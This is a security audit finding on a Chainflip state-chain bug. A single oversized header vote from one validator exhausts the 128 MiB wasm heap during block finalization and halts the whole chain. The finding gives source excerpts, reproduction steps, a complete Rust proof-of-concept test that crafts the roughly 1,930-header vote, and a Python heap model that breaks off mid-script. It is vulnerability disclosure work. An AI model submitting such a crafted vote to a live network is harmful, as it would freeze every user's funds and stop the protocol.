# F2: A single oversized BHW vote makes the elections pallet clone and retain every prefix of it inside the un-weighted on_finalize, the pinned 128 MiB wasm heap is exhausted, no block containing that transaction can ever be built, and the immortal extrinsic stays pending in every pool so every validator repeats the failure: the entire protocol shuts down, every user's funds on every chain become unwithdrawable, and the outage lasts until all 143 operators coordinate a purge

**Finding ID:** F2 (BHW vote-payload OOM).
**Severity:** **Critical** (network-wide, unbounded liveness halt of the entire chain from one fee-priced extrinsic). The trigger account is a validator seat, but the validator set is open-entry, not a trusted or permissioned role: anyone who meets the published requirements can buy one, so the barrier is capital, not trust.
**Target:** chainflip-io/chainflip-backend @ `e3a6838` (tag 2.2.13). `git diff 2.2.13 2.2.14 -- state-chain/pallets/cf-elections/` is empty; on current main the prefix-clone loop is unchanged and the split `do_vote(n)` weight is still flat, so the payload dimension is unfixed everywhere.
**Status:** Rust PoC compiled and executed for the first time in this audit (2/2 tests passing) inside `pallet-cf-elections`, running the real `BlockHeightWitnesser::validate` and the real `BlockHeightWitnesserConsensus::check_consensus` allocation path on a live-shaped 72-byte-header vote; the integer model re-runs 3/3 against live parameters. One synthetic input: the crafted vote itself (submitting it to Berghain would halt the chain, so it was never signed or sent).

## 1. Summary

Validators keep the state chain synchronized with foreign chains by voting on runs of block headers (the Block Height Witnesser). The pallet that receives those votes never limits how many headers one vote may carry and never charges for them: the declared weight of the vote extrinsic is a flat 65.6 microseconds that depends only on how many elections are voted on, not on payload size, while the operational extrinsic limit would accept about 91,000 headers (6.55 MB) on the wire. Nothing compares the voted hashes with the real foreign chain either: a fabricated, internally-consistent header run that starts at the height the election asks about is a valid vote.

When the block closes, `on_finalize` runs the consensus check over the stored votes, and that code clones and retains every prefix of every vote: a vote of L headers produces clones of length L, L-1 down to 1, all kept in memory, roughly 36 times L squared bytes for the live 72-byte header shape. The runtime executes as wasm with a hard-pinned heap of 2048 pages, exactly 128 MiB, that cannot grow. A vote of about 1,930 headers (roughly 139 KB on the wire) therefore exhausts the heap inside `finalize_block`, the runtime traps, and the block author cannot produce the block that contains the vote. The extrinsic itself applied cleanly moments earlier (it only writes storage), so it is still valid, its nonce is unconsumed, and being signable as Immortal it never expires: it sits pending in every transaction pool and the next author picks it up again. Every slot repeats the failure. The result is a total shutdown of the protocol: no swaps on any route, no withdrawals on any chain, no deposit crediting, no LP operations, no epoch rotation, and governance cannot vote a fix because voting requires blocks. Every user's funds on every chain become unwithdrawable for as long as the halt lasts, and the coins are safe but locked: they sit in the protocol's vaults, unmovable by anyone, including their owners. Recovery means all 143 operators purge the transaction from their local pools or restart with a patched authorship path, which is why the outage duration is unbounded.

The extrinsic requires a current authority account (`ensure_validator` plus authority membership), but that is not a trust boundary: validator admission on Chainflip is open-entry by capital. Anyone can call `register_as_validator` with no identity vetting, no whitelist and no governance vote on the operator, then win a seat in the on-chain FLIP auction; the live requirements are a 20,000 FLIP minimum balance to register and a 50,000 FLIP auction-floor bid (values read from Berghain storage), with seats rotating every 3-day epoch and no slashing path that specifically punishes a liveness act. So an unprivileged, untrusted actor with sufficient capital can acquire the trigger role without Chainflip's permission, and the attack itself then costs one extrinsic fee. Combined with the total, unbounded, network-wide outage, this is rated Critical. Honest engines self-cap their votes at 8 headers (16 on Tron), which is an engine-side convention only: the runtime enforces nothing, and that gap is the vulnerability. The precondition is live right now: all four BHW elections are Running on Berghain with non-zero witness heights, the authority set is 143 with consensus threshold 96, and only one vote is needed because the prefix staging happens before any threshold check.

## 2. Root cause (verified verbatim at `e3a6838`)

**2.1 The weight is payload-blind**
(`state-chain/pallets/cf-elections/src/weights.rs:93-101`, duplicate at `:411-418`):

```rust
/// The range of component `n` is `[1, 10]`.
fn vote(_n: u32, ) -> Weight {
	// Proof Size summary in bytes:
	//  Measured:  `1683`
	//  Estimated: `5148`
	// Minimum execution time: 64_281_000 picoseconds.
	Weight::from_parts(65_647_782, 5148)
		.saturating_add(T::DbWeight::get().reads(9_u64))
		.saturating_add(T::DbWeight::get().writes(2_u64))
}
```

Called with the number of votes, not headers (`cf-elections/src/lib.rs:1374`):

```rust
#[pallet::weight((T::WeightInfo::vote(authority_votes.len() as u32), DispatchClass::Operational))]
pub fn vote(
	origin: OriginFor<T>,
	authority_votes: Box<AuthorityVotes<T, I>>,
) -> DispatchResult {
	let (epoch_index, authority, authority_index) = Self::ensure_can_vote(origin)?;
```

**2.2 The payload is unbounded and unverified against reality**
(`block_height_witnesser/primitives.rs`):

```rust
pub struct NonemptyContinuousHeaders[T: ChainTypes] {
	first: Header<T>,
	headers: VecDeque<Header<T>>,
}
validate this (else NonemptyContinuousHeadersError) {
	empty: true,
	matching_hashes: pairs.clone().all(|(a, b)| a.hash == b.parent_hash),
	continuous_heights: pairs.clone().all(|(a, b)| a.block_height.saturating_forward(1) == b.block_height),
}
```

No length bound, and every check is internal to the submitted list. The only external constraint (`block_height_witnesser/state_machine.rs`) is that the first header's height equals the queried `witness_from_index`. `Header` is `{ block_height: u64, hash: H256, parent_hash: H256 }`: 72 bytes (`btc::BlockNumber = u64`, `btc::Hash = H256`).

**2.3 The quadratic clone loop, run before any threshold check**
(`block_height_witnesser/consensus.rs`, the Running branch):

```rust
for mut vote in self.votes.clone() {
	// we count a given vote as multiple votes for all nonempty subchains,
	// the longest subchain that achieves consensus wins
	while vote.len() > 1 {
		consensus.insert_vote(StagedVote { priority: vote.len(), vote: vote.clone() });
		vote.safe_pop_back();
	}
	consensus.insert_vote(StagedVote { priority: 1, vote: vote.clone() });
}
consensus.check_consensus(threshold)
```

Every prefix clone is retained in `StagedConsensus { stages: BTreeMap<Priority, Stage> }`, so the retained heap is 72 * L * (L + 1) / 2 bytes, approximately 36 * L^2, plus the outer `self.votes.clone()` copy and BTreeMap node overhead. The threshold on the last line is evaluated only after every insert: a single vote allocates the full ladder regardless of the 2/3 authority threshold.

**2.4 It runs in the un-weighted `on_finalize`**
(`cf-elections/src/lib.rs:1763` hook, `:1806` runner call; `state_machine_es.rs:174` on_finalize, `:213` per-election `check_consensus()`, `:249-283` vote insertion then consensus):

```rust
fn on_finalize(
	election_identifiers: Vec<crate::electoral_system::ElectionIdentifierOf<Self>>,
	contexts: &Self::OnFinalizeContext,
) -> Result<Self::OnFinalizeReturn, CorruptStorageError> {
	...
	for election_identifier in election_identifiers {
		let election_access = ElectoralAccess::election_mut(election_identifier);
		let properties = election_access.properties()?;
		if let Some(input) = election_access.check_consensus()?.has_consensus() {
```

The vote extrinsic itself only writes the vote to storage, so it applies cleanly during block building; the detonation is at block close, where FRAME charges nothing.

**2.5 The heap is hard-pinned at 128 MiB**
(Chainflip's polkadot-sdk fork, tag `chainflip-substrate-stable2509-2.2.7`, `client/executor/common/src/wasm_runtime.rs` and `.../runtime_blob.rs`; no override anywhere in chainflip-backend):

```rust
/// Default heap allocation pages.
pub const DEFAULT_HEAP_ALLOC_PAGES: u32 = 2048;

pub const DEFAULT_HEAP_ALLOC_STRATEGY: HeapAllocStrategy =
	HeapAllocStrategy::Static { extra_pages: DEFAULT_HEAP_ALLOC_PAGES };
```

```rust
HeapAllocStrategy::Static { extra_pages } => {
	let pages = initial.saturating_add(extra_pages);
	(pages, Some(pages))
},
*memory_ty = MemoryType::new(min, max);
```

The memory type is rewritten to `min == max == initial + 2048` pages: 128 MiB, not growable. `36 * L^2` crosses it between L = 1930 (127.88 MiB) and L = 1931 (128.02 MiB); with bookkeeping, L about 1928 (139 KB on the wire, against a 6.25 MB operational limit, `MAX_BLOCK_LENGTH` at `runtime/src/configs.rs:573`).

**2.6 Who can pull the trigger, and why it never expires**
(`cf-elections/src/lib.rs`, `ensure_can_vote`; `runtime/src/lib.rs:281`):

```rust
let validator_id = T::AccountRoleRegistry::ensure_validator(origin)?.into();
let authority_index = T::EpochInfo::authority_index(epoch_index, &validator_id);
ensure!(authority_index.is_some(), Error::<T, I>::Unauthorised);
```

```rust
frame_system::CheckEra<Runtime>,
```

Only a current authority can submit the vote, and the extrinsic is signable as Immortal. Validator admission itself is open-entry by capital: `register_as_validator` needs only FLIP balance above the governance-set minimum (live: 20,000 FLIP), and authority seats go to the winners of the on-chain FLIP auction each epoch (live bid floor: 50,000 FLIP). Honest engines self-cap at 8 headers per vote, 16 on Tron (`*_MAX_SUBMIT_HEADERS_IN_BHW_VOTER`, `runtime/src/chainflip/witnessing/*_elections.rs`): an engine-side convention the runtime does not enforce.

## 3. Impact (each proven directly in the PoC)

I1: Block production halts network-wide from one signed extrinsic. The model pins the threshold (L about 1,928 exceeds the 134,217,728-byte heap; L = 1,930 measured in the executed test), and the executed Rust test runs the real consensus path that performs the allocation.

I2: Everything that needs a state-chain transaction stops: swaps on every route, withdrawals on every chain, deposit crediting, LP registration and withdrawal, epoch rotation and keygen ceremonies, and governance itself, including the ability to vote through a runtime fix, because deploying a patch requires blocks.

I3: Every user's funds become unwithdrawable for the duration of the outage. The poison transaction never executes, state stays consistent, and the vaults on Bitcoin, Ethereum, Arbitrum, Solana, Polkadot, Assethub and Tron hold their coins, so no thief can move them; but with no blocks there is no egress on any chain, so every balance held on the state chain, every pending withdrawal and every in-flight swap output is frozen. The outage duration is unbounded (I4), so from the user's perspective the entire protocol's liquidity is locked indefinitely until operators act. This is a total shutdown of the protocol, not a degraded mode: there is no partial operation while the poison is pending.

I4: The outage duration is unbounded. Recovery requires all 143 operators to purge the transaction from their local pools or restart with a patched authorship path; nothing on-chain can accelerate that, which is the difference between this and an ordinary missed-slot event.

I5: The trigger costs one extrinsic fee, and the required authority seat is acquirable by any unprivileged actor through the open-entry FLIP auction (20,000 FLIP to register, 50,000 FLIP bid floor, live values) rather than through permission or trust, with no slashing path observed that specifically punishes a liveness act.

What this is not: not theft (coins are unmovable by anyone, including an attacker, and state stays consistent), not an escalation of privilege, not dependent on any second actor (one authority suffices, because the prefix staging precedes the threshold check).

## 4. Live Berghain State (read-only, at the PoC run)

The chain runs specVersion 20214 with all four BHW elections Running at non-zero witness heights (Bitcoin 968,324, Ethereum 26,042,762+, Arbitrum 508,241,929+, Tron 86,508,478+), so the Running branch of the consensus code is the live code path on every chain. The authority set is 143 with consensus threshold 96, and admission to that set is open: 20,000 FLIP minimum balance to register as a validator and a 50,000 FLIP auction bid floor, both read live from Validator storage. The extrinsic can legally carry about 91,022 headers (6.25 MB operational limit) against the roughly 1,928 needed, a 47x headroom, while its declared weight of 65,647,782 picoseconds is 0.0033 percent of the 2-second block budget. Epoch duration is 43,200 blocks with epoch 481 about halfway through, so the freeze would also lock the key-rotation clock. The finding is unfixed on the live 2.2 line and on main.

## 5. Steps to Reproduce (full setup)

```bash
# 1. install the drop-in test into the repo at tag 2.2.13 (e3a6838)
cp bhw_vote_oom.rs <repo>/state-chain/pallets/cf-elections/src/electoral_systems/tests/
#    and add to <repo>/state-chain/pallets/cf-elections/src/electoral_systems/tests.rs:
#        mod bhw_vote_oom;

# 2. build + run (native; pallet deps build in minutes, wasm build skipped)
cd <repo> && SKIP_WASM_BUILD=1 cargo test -p pallet-cf-elections bhw_vote_oom \
    -- --ignored --nocapture --test-threads=1

# 3. measure the real retained heap (macOS; Linux reads VmHWM inside the test)
/usr/bin/time -l <test-binary> --exact \
    electoral_systems::tests::bhw_vote_oom::poc_bhw_heap_scaling_table \
    --ignored --nocapture --test-threads=1

# 4. arithmetic model against live parameters (read-only RPC)
cd outputs/poc && PYTHONPATH=$PWD/F1-btc-poison python3 F2-bhw-oom/bhw_heap_growth.py --live
```

Everything is read-only against `https://rpc.mainnet.chainflip.io`. Never submit an oversized vote to a live chain.

## 6. Proof of Concept: full test code (raw)

### 6.1 `state-chain/pallets/cf-elections/src/electoral_systems/tests/bhw_vote_oom.rs` (verbatim, including the test-only `H256` newtype that satisfies the cfg(test) proptest bound while keeping `size_of::<Header>() == 72`)

```rust
// PoC: a single BHW vote payload exhausts the runtime's 128 MiB wasm heap.
// (Chainflip backend tag 2.2.13 == live Berghain spec_version 20214.)
//
// DROP-IN
// -------
//   1. copy this file to
//        <repo>/state-chain/pallets/cf-elections/src/electoral_systems/tests/bhw_vote_oom.rs
//   2. add one line to
//        <repo>/state-chain/pallets/cf-elections/src/electoral_systems/tests.rs
//      with
//        mod bhw_vote_oom;
//   3. run (native; ~128 MiB resident when the default L is used):
//        cd <repo>/state-chain
//        cargo test -p pallet-cf-elections bhw_vote_oom -- --ignored --nocapture --test-threads=1
//      `BHW_L=<n>` overrides the header count.
//
// WHY IT MATTERS (production call path)
// -------------------------------------
//   cf-elections::on_finalize                       lib.rs:1763-1806
//     -> ElectoralSystemRunner::on_finalize
//       -> StatemachineElectoralSystem::on_finalize  state_machine_es.rs:174-283
//           (this loop calls `election_access.check_consensus()?` on every election)
//         -> StatemachineElectoralSystem::check_consensus  state_machine_es.rs:262-284
//           -> BlockHeightWitnesserConsensus::check_consensus  consensus.rs:31-61
//                 for mut vote in self.votes.clone() {
//                     while vote.len() > 1 {
//                         consensus.insert_vote(StagedVote { priority: vote.len(),
//                                                            vote: vote.clone() });
//                         vote.safe_pop_back();
//                     }
//                     consensus.insert_vote(StagedVote { priority: 1, vote: vote.clone() });
//                 }
//
// Every prefix of the vote is cloned and *retained* in
// `StagedConsensus { stages: BTreeMap<priority, SupermajorityConsensus<NonemptyContinuousHeaders>> }`,
// so the retained heap is `bytes_per_header * L*(L+1)/2` (~= 36*L^2 for 72-byte headers).
// On wasm the host pins the runtime's linear memory: `DEFAULT_HEAP_ALLOC_PAGES = 2048` with
// `HeapAllocStrategy::Static`, and the executor rewrites the memory type to
// `min == max == initial + extra_pages` (polkadot-sdk
// `client/executor/common/src/wasm_runtime.rs:26-30`,
// `client/executor/common/src/runtime_blob/runtime_blob.rs:163-175`), i.e. 128 MiB.
// `36*L^2` alone crosses it between L = 1930 and 1931, and L = 1928 already suffices once the
// per-prefix BTreeMap bookkeeping and the `self.votes.clone()` copy are counted
// (see `bhw_heap_growth.py`) -- a ~139 KB extrinsic: `vote` is
// `DispatchClass::Operational` (6.25 MB limit) and its weight is payload-blind
// (`fn vote(_n) = Weight::from_parts(65_647_782, 5148)`, weights.rs:93-101; called with
// `authority_votes.len()` at lib.rs:1374).
//
// The vote itself is *valid*: `BlockHeightWitnesser::validate` only requires a continuous header
// chain (heights step by `saturating_forward(1)`, `hash`/`parent_hash` chain internally) that
// starts at the currently queried `witness_from_index` (state_machine.rs:69-83). Nothing compares
// those hashes with the real chain's headers, and the allocation happens *before* consensus is
// evaluated, so one authority's vote is enough (the 2/3 threshold, 96 of 143 live, is irrelevant
// for the blow-up).
//
// On native the test cannot trap; it measures the process' peak RSS high-water mark
// (`VmHWM`) to show the retained heap really is the quadratic sum. On wasm the same allocation
// sequence fails inside `on_finalize`, i.e. inside `block_builder.build()`, so the author cannot
// produce the block that contains the vote; the transaction stays valid and (being `Immortal`)
// pending forever while no blocks are produced.

use crate::electoral_systems::{
	block_height_witnesser::{
		consensus::BlockHeightWitnesserConsensus,
		primitives::{Header, NonemptyContinuousHeaders},
		state_machine::BlockHeightWitnesser,
		BHWTypes, ChainTypes, HeightWitnesserProperties,
	},
	state_machine::{
		consensus::{ConsensusMechanism, SuccessThreshold},
		state_machine::AbstractApi,
	},
};
use cf_traits::hook_test_utils::EmptyHook;
use cf_utilities::define_empty_struct;
use sp_core::H256;
use std::collections::VecDeque;

/// `H256` wrapped to satisfy the test-only `MaybeArbitrary` (proptest) bound that
/// `ChainBlockHashTrait` carries in `cfg(test)` builds. `repr(transparent)` keeps
/// `size_of::<Header<LiveLikeChain>>() == 72`, i.e. the live u64+H256+H256 shape.
#[derive(
	Clone, PartialEq, Eq, PartialOrd, Ord, Debug, codec::Encode, codec::Decode,
	scale_info::TypeInfo, serde::Serialize, serde::Deserialize, proptest_derive::Arbitrary,
)]
#[repr(transparent)]
pub struct H256Arb(pub [u8; 32]);

impl H256Arb {
	fn from_h256(h: H256) -> Self {
		Self(h.0)
	}
}

impl cf_traits::Validate for H256Arb {
	type Error = core::convert::Infallible;
	fn is_valid(&self) -> Result<(), Self::Error> {
		Ok(())
	}
}

impl codec::DecodeWithMemTracking for H256Arb {}

/// The host-pinned capacity of the runtime's wasm linear memory used as the heap:
/// 2048 pages (`DEFAULT_HEAP_ALLOC_PAGES`) * 64 KiB.
const WASM_HEAP_BYTES: usize = 2048 * 64 * 1024; // 134_217_728 B = 128 MiB

/// Live `witness_from_index` for the Bitcoin BHW when this PoC was written
/// (`BitcoinChainTracking` height 968_309 + 1). Any live/queried height works: the crafted vote
/// only has to start wherever the current election asks it to.
const FROM: u64 = 968_310;

/// Headers in the attacker's vote. 1930 is the value implied by the pure quadratic term
/// (`36*1930^2 = 134,096,400 B` just under 128 MiB); the realistic threshold is 1,928 once the
/// per-prefix bookkeeping (~110 B for the BTreeMap entry) and the outer `self.votes.clone()` copy
/// are included. The test asserts the model exceeds the cap for the default value.
const DEFAULT_L: usize = 1930;

define_empty_struct! { struct LiveLikeChain; }

impl ChainTypes for LiveLikeChain {
	// Exactly the live shape: `btc::BlockNumber = u64`, `btc::Hash = H256`.
	// (bitcoin_elections.rs:77-81; ethereum/arbitrum/tron_elections.rs use u64 + H256 too.)
	type ChainBlockNumber = u64;
	type ChainBlockHash = H256Arb;

	const NAME: &'static str = "LiveLikeBtc";
}

define_empty_struct! { struct LiveLikeBHW; }

impl BHWTypes for LiveLikeBHW {
	type Chain = LiveLikeChain;
	type BlockHeightChangeHook = EmptyHook;
	type ReorgHook = EmptyHook;
}

/// One continuous chain of `len` headers starting at `FROM`.
///
/// Only the *internal* consistency is checked (`hash[i] == parent_hash[i+1]` and
/// `block_height[i+1] == block_height[i].saturating_forward(1)`), so the hashes are free.
fn vote_of(len: usize) -> NonemptyContinuousHeaders<LiveLikeChain> {
	let headers = (0..len)
		.map(|i| Header {
			block_height: FROM.saturating_add(i as u64),
			hash: H256Arb::from_h256(H256::from_low_u64_be(i as u64 + 1)),
			parent_hash: H256Arb::from_h256(H256::from_low_u64_be(i as u64)),
		})
		.collect::<VecDeque<_>>();
	NonemptyContinuousHeaders::try_new(headers).expect("continuous headers")
}

/// Peak resident set size (high-water mark) of this test process, in KiB: never decreases, so the
/// difference across the allocation shows the transient peak. Linux only; `None` elsewhere.
fn peak_rss_kb() -> Option<u64> {
	let status = std::fs::read_to_string("/proc/self/status").ok()?;
	status
		.lines()
		.find_map(|line| line.strip_prefix("VmHWM:"))
		.and_then(|rest| rest.trim().trim_end_matches("kB").trim().parse().ok())
}

fn model_bytes(len: usize, header_bytes: usize) -> (usize, usize, usize) {
	let prefixes = header_bytes * len * (len + 1) / 2;
	let outer_clone = header_bytes * len;
	let map_nodes = 110 * len; // ~110 B per retained prefix (BTreeMap key + node overhead)
	(prefixes, outer_clone, map_nodes)
}

/// The OOM trap: one valid vote of `BHW_L` headers (default 1930, ~140 KB on the wire) makes
/// `check_consensus` retain more than the whole wasm heap.
#[test]
#[ignore = "allocates ~128 MiB of retained heap; run explicitly with --ignored"]
fn poc_bhw_single_large_vote_exhausts_the_wasm_heap() {
	let len: usize = std::env::var("BHW_L").ok().and_then(|v| v.parse().ok()).unwrap_or(DEFAULT_L);
	let header_bytes = std::mem::size_of::<Header<LiveLikeChain>>();
	assert_eq!(
		header_bytes, 72,
		"must mirror the live chains (u64 block number + two H256 hashes)"
	);

	let vote = vote_of(len);
	assert_eq!(vote.len(), len);

	// the crafted vote is *valid* for the queried election properties
	let properties = HeightWitnesserProperties { witness_from_index: FROM };
	let validation = <BlockHeightWitnesser<LiveLikeBHW> as AbstractApi>::validate(&properties, &vote);
	assert!(validation.is_ok(), "the crafted vote must pass BHW vote validation: {validation:?}");

	let (prefixes, outer_clone, map_nodes) = model_bytes(len, header_bytes);
	let model_total = prefixes + outer_clone + map_nodes;
	println!(
		"vote: L={len} headers = {encoded} B on the wire; \
		 retained model = {prefixes} B (prefixes) + {outer_clone} B (votes.clone) \
		 + {map_nodes} B (BTreeMap) = {model_total} B ({model_mib:.1} MiB) \
		 vs wasm heap {WASM_HEAP_BYTES} B ({heap_mib:.0} MiB)",
		encoded = len * header_bytes,
		model_mib = model_total as f64 / 2f64.powi(20),
		heap_mib = WASM_HEAP_BYTES as f64 / 2f64.powi(20),
	);

	let before = peak_rss_kb();
	let mut consensus = BlockHeightWitnesserConsensus::<LiveLikeBHW>::default();
	consensus.insert_vote(vote);
	// This is the call the pallet makes from `on_finalize` (state_machine_es.rs:245 -> consensus.rs)
	let result = consensus.check_consensus(&(SuccessThreshold { success_threshold: 1 }, properties));
	let after = peak_rss_kb();

	// keep the result alive until after the measurement
	assert!(result.is_some(), "the single vote reaches its own (priority = L) stage");

	match (before, after) {
		(Some(b), Some(a)) => {
			let delta_kb = a.saturating_sub(b);
			println!(
				"peak RSS: before {b} KiB, after {a} KiB, delta {delta_kb} KiB \
				 ({delta_mib:.1} MiB, model predicted {model_mib:.1} MiB)",
				delta_mib = delta_kb as f64 / 1024.0,
				model_mib = model_total as f64 / 2f64.powi(20),
			);
			assert!(
				delta_kb * 1024 > 100 * 1024 * 1024,
				"the retained heap must be > 100 MiB at L={len} (measured {delta_kb} KiB)"
			);
		},
		_ => println!("/proc/self/status unavailable (non-Linux host): RSS measurement skipped; \
		               the model still exceeds the wasm heap"),
	}

	assert!(
		model_total > WASM_HEAP_BYTES,
		"L={len} must exceed the {WASM_HEAP_BYTES} B wasm heap (model = {model_total} B)"
	);
	println!(
		"=> on wasm this allocation fails inside on_finalize: the block containing the vote \
		 cannot be produced and the (Immortal) tx stays pending."
	);
}

/// Informational ladder: the retained heap grows quadratically in the vote length.
/// (VmHWM is monotone, so run the lengths in increasing order to read the increments.)
#[test]
#[ignore = "informational; allocates up to ~128 MiB"]
fn poc_bhw_heap_scaling_table() {
	let header_bytes = std::mem::size_of::<Header<LiveLikeChain>>();
	let mut previous_hwm = peak_rss_kb();
	for len in [250usize, 500, 1000, 1930] {
		let (prefixes, outer_clone, map_nodes) = model_bytes(len, header_bytes);
		let mut consensus = BlockHeightWitnesserConsensus::<LiveLikeBHW>::default();
		consensus.insert_vote(vote_of(len));
		let _ = consensus.check_consensus(&(
			SuccessThreshold { success_threshold: 1 },
			HeightWitnesserProperties { witness_from_index: FROM },
		));
		let hwm = peak_rss_kb();
		println!(
			"L={len:>5}  model {:>12} B ({:>6.1} MiB)  cumulative peak RSS delta {:?}",
			prefixes + outer_clone + map_nodes,
			(prefixes + outer_clone + map_nodes) as f64 / 2f64.powi(20),
			match (previous_hwm, hwm) {
				(Some(p), Some(h)) => Some(h.saturating_sub(p)),
				_ => None,
			}
		);
		previous_hwm = hwm;
	}
}
```

### 6.2 `outputs/poc/F2-bhw-oom/bhw_heap_growth.py` (verbatim, the integer model run against live parameters)

```python
#!/usr/bin/env python3
"""BHW vote-payload OOM trap: 128 MiB wasm heap vs the O(L^2) prefix cloning.

Code under test (all in state-chain/pallets/cf-elections):

  * `fn vote(_n: u32) -> Weight::from_parts(65_647_782, 5148)`   weights.rs:93-101
    -- the dispatchable's weight depends on the *number of votes in the extrinsic*
       (`authority_votes.len()`, lib.rs:1374), never on the payload's header count.
  * `NonemptyContinuousHeaders { first: Header, headers: VecDeque<Header> }`  primitives.rs:81-83
    -- no on-chain length bound; `Header = { block_height, hash, parent_hash }`
       (u64 + H256 + H256 = 72 SCALE bytes for every live BHW chain: BTC/ETH/ARB/Tron; 68 for
       Dot/Assethub because PolkadotBlockNumber = u32).
  * consensus.rs:31-61 (the `Running` branch, `witness_from_index != 0`):

        for mut vote in self.votes.clone() {
            while vote.len() > 1 {
                consensus.insert_vote(StagedVote { priority: vote.len(), vote: vote.clone() });
                vote.safe_pop_back();
            }
            consensus.insert_vote(StagedVote { priority: 1, vote: vote.clone() });
        }

    Every prefix of the vote is cloned and retained in
    `StagedConsensus { stages: BTreeMap<priority, SupermajorityConsensus<NonemptyContinuousHeaders>> }`,
    i.e. the retained heap is the sum of the prefix lengths:

        retained(L) = bytes_per_header * L*(L+1)/2            ( ~= 36 * L^2 bytes for 72-byte headers )

  * that code runs inside `on_finalize` (lib.rs:1763-1806 -> state_machine_es.rs:174-283 ->
    `election_access.check_consensus()`), i.e. while the block author builds the block.

The host executor pins the runtime's linear memory: `DEFAULT_HEAP_ALLOC_PAGES = 2048` pages with
`HeapAllocStrategy::Static`, and the blob rewriting sets `min == max == initial + extra_pages`
(polkadot-sdk `client/executor/common/src/wasm_runtime.rs:26-30`,
`.../runtime_blob/runtime_blob.rs:163-175`) => the runtime heap is at most 2048 * 64 KiB = 128 MiB.

Usage:
    python3 bhw_heap_growth.py                 # arithmetic only
    python3 bhw_heap_growth.py --live          # + live heights/authorities (read-only RPC)
    python3 bhw_heap_growth.py --assert        # exit 1 if the numbers do not line up
"""

import argparse
import json
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "btc"))
from cf_btc_lib import (  # noqa: E402
    storage_key, get_storage, decode_u64, decode_compact_len,
)

# ---- constants --------------------------------------------------------------------------------
PAGE_BYTES = 64 * 1024
EXTRA_HEAP_PAGES = 2048                      # DEFAULT_HEAP_ALLOC_PAGES (polkadot-sdk)
WASM_HEAP_BYTES = EXTRA_HEAP_PAGES * PAGE_BYTES           # 134_217_728 B = 128 MiB
MAX_BLOCK_LENGTH = 1024 * 1024 * 625 // 100               # runtime/src/configs.rs:573 (6.25 MB)
OPERATIONAL_LIMIT = MAX_BLOCK_LENGTH                      # `vote` is DispatchClass::Operational
WEIGHT_DECLARED = (65_647_782, 5148)                      # (ref_time ps, proof size) weights.rs:93
BLOCK_WEIGHT_REF_TIME = 2_000_000_000_000                 # 2 s budget (runtime/src/configs.rs)

# Header size = SCALE(block_height) + 32 + 32, per live ChainTypes impl:
#   bitcoin_elections.rs:77-81 / ethereum_elections.rs:71 / arbitrum_elections.rs:71 /
#   tron_elections.rs:81  -> ChainBlockNumber = u64 (btc::BlockNumber = u64, btc.rs:70),
#                              ChainBlockHash   = H256
#   dot/assethub          -> PolkadotBlockNumber = u32 (primitives/src/lib.rs:135)
HEADER_BYTES = {
    "Bitcoin": 72, "Ethereum": 72, "Arbitrum": 72, "Tron": 72,
    "Polkadot": 68, "Assethub": 68, "Solana": 72,
}

# Extra heap per retained prefix, on top of the header buffer itself:
#  * `NonemptyContinuousHeaders` is a BTreeMap *key* (Header 72 + VecDeque descriptor 32 = 104 B
#    value-side per entry) and the value is a u32 counter (4 B), stored in 11-slot BTreeMap nodes
#    with a 16-byte node header  ->  ~110 B per prefix entry.
BSTREEMAP_PER_ENTRY_BYTES = 110


def retained(L, header_bytes, extra_copy=False, per_entry=BSTREEMAP_PER_ENTRY_BYTES):
    """Exact retained heap for a single vote of L headers (integer arithmetic, no floats)."""
    prefixes = header_bytes * L * (L + 1) // 2          # sum of all prefix buffers
    outer_clone = header_bytes * L if extra_copy else 0  # `self.votes.clone()` copy of the vote
    nodes = per_entry * L                                # BTreeMap bookkeeping per prefix entry
    return prefixes + outer_clone + nodes


def first_over(cap, header_bytes, extra_copy=True, per_entry=BSTREEMAP_PER_ENTRY_BYTES, lmax=200_000):
    for L in range(1, lmax):
        if retained(L, header_bytes, extra_copy, per_entry) > cap:
            return L
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--live", action="store_true", help="also read live chain heights (read-only)")
    ap.add_argument("--json")
    ap.add_argument("--assert", dest="do_assert", action="store_true")
    args = ap.parse_args()

    out = {"checks": []}

    def check(name, ok, detail=""):
        out["checks"].append({"check": name, "ok": bool(ok), "detail": detail})
        return ok

    print("=" * 100)
    print("BHW vote OOM trap: heap arithmetic")
    print("=" * 100)
    print(f"wasm heap cap           = {EXTRA_HEAP_PAGES} pages x {PAGE_BYTES} B "
          f"= {WASM_HEAP_BYTES:,} B = {WASM_HEAP_BYTES / 2**20:.0f} MiB")
    print(f"extrinsic size limit    = {OPERATIONAL_LIMIT:,} B (Operational class, "
          f"MAX_BLOCK_LENGTH = 6.25 MB, configs.rs:573/585)")
    print(f"declared vote weight    = {WEIGHT_DECLARED[0]:,} ps "
          f"({WEIGHT_DECLARED[0] / BLOCK_WEIGHT_REF_TIME * 100:.5f}% of the 2 s block budget), "
          f"proof size {WEIGHT_DECLARED[1]:,} B: payload-blind")
    print()

    h = HEADER_BYTES["Bitcoin"]
    print(f"headers that fit one extrinsic (72 B each, ignoring the enclosing struct): "
          f"{OPERATIONAL_LIMIT // h:,}")
    print()

    print("model: retained(L) = h*(L*(L+1)/2)  [+ h*L for the `self.votes.clone()` copy]")
    print("                       [+ 110 B per prefix for the StagedConsensus BTreeMap nodes]")
    print()
    print(f"{'L':>6} | {'header copy (h*L*(L+1)/2)':>26} | {'+ outer clone':>14} | "
          f"{'+ BTree nodes':>14} | {'total':>15} | {'vs 128 MiB':>11}")
    print("-" * 100)
    rows = {}
    for L in (100, 500, 1000, 1500, 1900, 1930, 1931, 2000):
        base = h * L * (L + 1) // 2
        outer = h * L
        nodes = BSTREEMAP_PER_ENTRY_BYTES * L
        total = base + outer + nodes
        rows[L] = {"prefix_bytes": base, "outer_clone_bytes": outer, "btree_node_bytes": nodes,
                   "total_bytes": total}
        print(f"{L:>6} | {base:>26,} | {outer:>14,} | {nodes:>14,} | {total:>15,} | "
              f"{total / WASM_HEAP_BYTES * 100:>10.1f}%")
    print()

    l_ideal = first_over(WASM_HEAP_BYTES, h, extra_copy=False, per_entry=0)
    l_model = first_over(WASM_HEAP_BYTES, h, extra_copy=True, per_entry=BSTREEMAP_PER_ENTRY_BYTES)
    l_buffers_only = first_over(WASM_HEAP_BYTES, h, extra_copy=False,
                                per_entry=BSTREEMAP_PER_ENTRY_BYTES)
    print("solved thresholds (smallest L that exceeds the cap):")
    print(f"  * prefix buffers only, no overhead at all : L = {l_ideal}")
